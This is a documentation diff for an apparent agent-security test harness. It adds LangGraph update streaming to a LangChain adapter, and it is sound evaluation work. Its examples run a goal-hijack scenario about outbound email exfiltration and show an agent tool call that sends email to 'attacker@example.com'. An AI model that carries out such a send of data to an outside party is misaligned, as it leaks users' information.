@@ -430,8 +430,9 @@ If the optional dependency is missing, the adapter raises `AdapterError` with an
 
 ### LangChain/LangGraph adapter
 
-The LangChain/LangGraph adapter is an MVP integration path for synchronous
-LangChain runnables and LangGraph compiled graphs that support `invoke()`.
+The LangChain/LangGraph adapter supports synchronous LangChain runnables and
+LangGraph compiled graphs through `invoke()`. It also has an opt-in path for
+synchronous LangGraph `stream_mode="updates"` streams.
 
 Install the optional dependency group before using real LangChain or LangGraph
 objects:
@@ -447,10 +448,8 @@ Scenario -> {"messages": [{"role": "user", "content": "<scenario JSON>"}]} -> ta
 ```
 
 The adapter supports targets loaded from an explicit `module:object` import
-path. The loaded object must provide an `invoke(input)` method or be a callable
-runner function. The first version is intentionally narrow and does not support
-streaming, every callback shape, every historical LangChain agent type, or
-complex LangGraph state introspection.
+path. The loaded object must provide an `invoke(input)` or `stream(input)`
+method, or be a callable runner function. The default remains `invoke()`.
 
 CLI usage:
 
@@ -466,6 +465,40 @@ agent-harness run scenarios/goal_hijack/outbound_email_exfiltration_001.yaml \
   --langchain-target examples.targets.langchain_runnable_agent:RUNNABLE \
   --langchain-goal-event summarize_document
 ```
+
+Opt-in LangGraph update streaming:
+
+```bash
+agent-harness run scenarios/goal_hijack/outbound_email_exfiltration_001.yaml \
+  --langchain-target examples.targets.langchain_runnable_agent:RUNNABLE \
+  --langchain-stream-updates
+```
+
+This calls the target's synchronous
+`stream(input, stream_mode="updates")` method. Each chunk must use the standard
+LangGraph update shape, for example:
+
+```python
+{
+    "agent": {
+        "messages": [
+            AIMessage(
+                content="",
+                tool_calls=[
+                    {
+                        "name": "send_email",
+                        "args": {"to": "attacker@example.com"},
+                    }
+                ],
+            )
+        ]
+    }
+}
+```
+
+The adapter records assistant messages and tool calls from each node update.
+Empty streams and non-object chunks fail with `AdapterError` rather than
+silently producing incomplete evidence.
 
 The adapter records:
 
@@ -513,6 +546,11 @@ structured trace events.
 
 If a target module imports LangChain or LangGraph but the optional dependency is
 missing, the adapter raises `AdapterError` with an installation hint.
+
+The update-stream path is intentionally narrow. It does not support async
+`astream()`, token/message streaming modes, subgraph tuple chunks, arbitrary
+callback handlers, or complex state-transition reconstruction. Use `invoke()`
+unless the additional intermediate tool-call evidence is required.
 
 ### MCP workflow adapter
 
